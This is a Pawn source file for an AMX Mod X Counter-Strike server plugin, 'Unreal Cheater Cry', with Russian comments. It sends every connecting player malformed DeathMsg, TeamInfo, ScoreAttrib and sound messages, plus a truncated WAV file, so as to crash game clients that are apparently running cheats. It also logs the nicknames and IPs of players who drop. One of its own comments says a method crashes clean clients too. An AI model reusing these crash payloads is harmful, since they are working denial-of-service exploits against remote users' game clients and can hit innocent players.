#include <amxmodx>
#include <amxmisc>
#include <reapi>

new const Plugin_sName[] = "Unreal Cheater Cry";
new const Plugin_sVersion[] = "1.1";
new const Plugin_sAuthor[] = "Karaulov";

new g_sUserNames[MAX_PLAYERS + 1][33];
new g_sUserIps[MAX_PLAYERS + 1][33];
new bool:g_bUserWait[MAX_PLAYERS + 1] = {false,...};
new bool:g_bUserCrash[MAX_PLAYERS + 1] = {false,...};
new Float:g_fUserWait[MAX_PLAYERS + 1] = {0.0,...};

new g_sCrashSound[64];

// Начало запуска плагина
public plugin_init()
{
// Регистрация плагина, название версия и автор
    register_plugin(Plugin_sName, Plugin_sVersion, Plugin_sAuthor);
// Регистрация серверного квара что бы можно было найти все сервера с этим хорошим плагином
    register_cvar("unreal_cheater_cry", Plugin_sVersion, FCVAR_SERVER | FCVAR_SPONLY);
// Регистрация пакетов движения простого и движения в воздухе
    RegisterHookChain(RG_PM_Move, "PM_Move", .post = false);
}

public plugin_precache()
{
    new tmpString[64];
    RandomString(tmpString, 20);
    formatex(g_sCrashSound, 64, "sound/player/%s.wav", tmpString);
    CreateEmptySoundFile(g_sCrashSound);
    precache_sound(g_sCrashSound);
    delete_file(g_sCrashSound,true, "GAMECONFIG");
}

// Игрок начинает подключение к серверу
public client_connectex(id, const name[], const ip[], reason[128])
{   
// При подключении клиента сохраняем его никнейм и айпишник
    copy(g_sUserNames[id],charsmax(g_sUserNames[]), name);
    copy(g_sUserIps[id],charsmax(g_sUserIps[]), ip);
// При подключении клиента удаляем все таски с номером игрока
    if(task_exists(id))
        remove_task(id);
// Установить флаг проверки в false
    g_bUserWait[id] = false;
    g_bUserCrash[id] = false;
    return PLUGIN_CONTINUE;
}


// Если игрок прислал пакет MOVE, то его не выкинуло. 
// Установить флаг проверки в false
public PM_Move(const id)
{
    if ( id >= 1 && id <= MAX_PLAYERS )
    {
        if (g_bUserWait[id] && get_gametime() - g_fUserWait[id] > 0.7)
        {
            g_bUserWait[id] = false;
        }
        if (g_bUserCrash[id])
        {                
            g_bUserCrash[id] = false;
            make_cheater_cry_method1(id);
            make_cheater_cry_method2(id);

            // Закомментированные методы вызывают ложные на некоторых протекторах:
            // make_cheater_cry_method3(id);
            // make_cheater_cry_method4(id);

            make_cheater_cry_method5(id);
            make_cheater_cry_method6(id);

            g_bUserWait[id] = true;
            g_fUserWait[id] = get_gametime();
        }
    }
}

// Игрок подключился к серверу
public client_putinserver(id)
{
    if (is_user_hltv(id) || is_user_bot(id)) return;
// Установить флаг проверки в false
    g_bUserWait[id] = false;
    g_bUserCrash[id] = false;
// При подключении клиента удаляем все таски с номером игрока
    if(task_exists(id))
        remove_task(id);
// Запускаем две попытки краша, сразу, и через несколько минут
// если читер включает чит не перед игрой
    g_bUserCrash[id] = true;
    set_task(random_float(60.0,500.0),"start_make_cheater_cry",id);
}

// Игрок отключился от сервера
public client_disconnected(id, bool:drop, message[], maxlen)
{
// При отключении клиента удаляем все таски с номером игрока
    if(task_exists(id))
        remove_task(id);

    if (drop && equal(message,"Timed out") && g_bUserWait[id])
    {
        client_print_color(0,print_team_blue, "^3[CHEATER_CRY]^1 Игрок ^4%s^3 попытался войти с читом...Но не смог :)", g_sUserNames[id]);
        log_to_file("unreal_cheater_cry.log","Игрок %s [IP:%s] попытался войти с читом...", g_sUserNames[id],g_sUserIps[id]);
    }
 
    g_bUserWait[id] = false;
    g_bUserCrash[id] = false;
}

// Функция краша использующая 5 различных метода которые должны вызвать падения 
// если используются модификации клиента (чит программы)
public start_make_cheater_cry(id)
{
    if (is_user_connected(id))
    {
        //Сделать краш игрока если он подаст "признаки жизни"
        g_bUserCrash[id] = true;
    }
}


public make_cheater_cry_method1(id)
{
    static deathMsg = 0;

    if ( deathMsg == 0 )
        deathMsg = get_user_msgid ( "DeathMsg" );
   
    message_begin( MSG_ONE, deathMsg, _,id );
    write_byte( id );
    write_byte( 64 );
    write_byte( 1 );
    write_string( "knife" );
    message_end();
    
    message_begin( MSG_ONE, deathMsg, _,id );
    write_byte( id );
    write_byte( 33 );
    write_byte( 0 );
    write_string( "deagle" );
    message_end();

    message_begin( MSG_ONE, deathMsg, _,id );
    write_byte( id );
    write_byte( random_num(33,64) );
    write_byte( 0 );
    write_string( "knife" );
    message_end();
}

public make_cheater_cry_method2(id)
{
    static teamInfo = 0;

    if ( teamInfo == 0 )
        teamInfo = get_user_msgid ( "TeamInfo" );
   
    message_begin( MSG_ONE, teamInfo, _,id );
    write_byte( 255 );
    write_string( "CT" );
    message_end();
    
    message_begin( MSG_ONE, teamInfo, _,id );
    write_byte( 125 );
    write_string( "CT" );
    message_end();
    
    message_begin( MSG_ONE, teamInfo, _,id );
    write_byte( 33 );
    write_string( "TERRORIST" );
    message_end();
    
    message_begin( MSG_ONE, teamInfo, _,id );
    write_byte( random_num(33,255) );
    write_string( "UNASSIGNED" );
    message_end();
}

public make_cheater_cry_method3(id)
{
    message_begin( MSG_ONE, SVC_STUFFTEXT, _,id );
    write_string( "" );
    message_end();
    message_begin( MSG_ONE, SVC_STUFFTEXT, _,id );
    write_string( ";" );
    message_end();
}

public make_cheater_cry_method4(id)
{
    message_begin(MSG_ONE, SVC_SPAWNSTATICSOUND, .player = id);
    write_coord_f(random_float(-1000.0,1000.0));
    write_coord_f(random_float(-1000.0,1000.0));
    write_coord_f(random_float(-1000.0,1000.0));
    write_short(511);
    write_byte(255);
    write_byte(255);
    write_short(id == 1 ? 2 : 1); 
    write_byte(255);
    write_byte(0);
    message_end();
   
    message_begin(MSG_ONE, SVC_SPAWNSTATICSOUND, .player = id);
    write_coord_f(random_float(-1000.0,1000.0));
    write_coord_f(random_float(-1000.0,1000.0));
    write_coord_f(random_float(-1000.0,1000.0));
    // Если pich > 0 то краш даже у клиента без читов :)
    write_short(512);
    write_byte(255);
    write_byte(255);
    write_short(id == 1 ? 2 : 1); 
    write_byte(0);
    write_byte(0);
    message_end();
}

public make_cheater_cry_method5(id)
{
    static scoreAttrib = 0;

    if ( scoreAttrib == 0 )
        scoreAttrib = get_user_msgid ( "ScoreAttrib" );
   
    message_begin( MSG_ONE, scoreAttrib, _,id );
    write_byte( 255 );
    write_byte( random_num(1,4) );
    message_end();
    
    message_begin( MSG_ONE, scoreAttrib, _,id );
    write_byte( 33 );
    write_byte( random_num(1,4) );
    message_end();

    message_begin( MSG_ONE, scoreAttrib, _,id );
    write_byte( 175 );
    write_byte( random_num(1,4) );
    message_end();
    
    message_begin( MSG_ONE, scoreAttrib, _,id );
    write_byte( random_num(33,255) );
    write_byte( random_num(1,4) );
    message_end();
}

public make_cheater_cry_method6(id)
{
    rh_emit_sound2(id, id, random_num(0,100) > 50 ? CHAN_VOICE : CHAN_STREAM, g_sCrashSound, VOL_NORM, ATTN_NORM);
}

stock CreateEmptySoundFile(const path[])
{
    new file = fopen(path, "wb", true, "GAMECONFIG");
    if (file)
    {
        // Writing the WAV header
		// 1179011410 = "RIFF"
        fwrite(file, 1179011410, BLOCK_INT);
        fwrite(file, 0, BLOCK_INT);
        fclose(file);
    }
}

new const g_CharSet[] = "abcdefghijklmnopqrstuvwxyz";

stock RandomString(dest[], length)
{
    new i, randIndex;
    new charsetLength = strlen(g_CharSet);

    for (i = 0; i < length; i++)
    {
        randIndex = random(charsetLength);
        dest[i] = g_CharSet[randIndex];
    }

    dest[length - 1] = EOS;  // Null-terminate the string
}